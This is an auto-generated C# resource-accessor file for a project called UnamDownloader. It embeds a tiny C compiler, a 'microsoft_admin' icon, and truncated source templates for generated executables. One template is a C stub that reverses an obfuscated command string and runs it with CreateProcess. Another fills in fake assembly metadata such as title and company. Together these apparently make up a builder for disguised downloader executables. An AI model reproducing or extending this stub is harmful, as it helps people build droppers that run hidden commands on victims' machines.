//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.42000
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace UnamDownloader.Properties {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("UnamDownloader.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        internal static byte[] administrator {
            get {
                object obj = ResourceManager.GetObject("administrator", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        internal static byte[] manifest {
            get {
                object obj = ResourceManager.GetObject("manifest", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Drawing.Bitmap.
        /// </summary>
        internal static System.Drawing.Bitmap microsoft_admin {
            get {
                object obj = ResourceManager.GetObject("microsoft_admin", resourceCulture);
                return ((System.Drawing.Bitmap)(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.IO;
        ///using System.Text;
        ///using System.Diagnostics;
        ///using System.Runtime.InteropServices;
        ///#if DefDebug
        ///using System.Windows.Forms;
        ///#endif
        ///#if DefAdmin
        ///using System.Security.Principal;
        ///#endif
        ///#if DefAssembly
        ///using System.Reflection;
        ///[assembly: AssemblyTitle(&quot;%Title%&quot;)]
        ///[assembly: AssemblyDescription(&quot;%Description%&quot;)]
        ///[assembly: AssemblyCompany(&quot;%Company%&quot;)]
        ///[assembly: AssemblyProduct(&quot;%Product%&quot;)]
        ///[assembly: AssemblyCopyright(&quot;%Copyright%&quot;)]
        ///[assembly: AssemblyTrademark(&quot;%Trademark%&quot;) [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string Program {
            get {
                return ResourceManager.GetString("Program", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &lt;windows.h&gt;
        ///
        ////* Created by Unam Sanctam, https://github.com/UnamSanctam */
        ///
        ///void inplace_rev( char * s ) {
        ///  char t, *e = s + strlen(s);
        ///  while ( --e &gt; s ) { t = *s;*s++=*e;*e=t; }
        ///}
        ///
        ///int main(int argc, char **argv) 
        ///{
        ///	  PROCESS_INFORMATION p_info;
        ///	  STARTUPINFO s_info;
        ///
        ///	  memset(&amp;s_info, 0, sizeof(s_info));
        ///	  memset(&amp;p_info, 0, sizeof(p_info));
        ///	  s_info.cb = sizeof(s_info);
        ///	  
        ///	  char commands[] = &quot;#COMMAND&quot;;
        ///	  
        ///	  inplace_rev(commands);
        ///
        ///	  if (CreateProcess(NULL, commands, NULL, NULL, FA [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string Program1 {
            get {
                return ResourceManager.GetString("Program1", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        internal static byte[] tinycc {
            get {
                object obj = ResourceManager.GetObject("tinycc", resourceCulture);
                return ((byte[])(obj));
            }
        }
    }
}
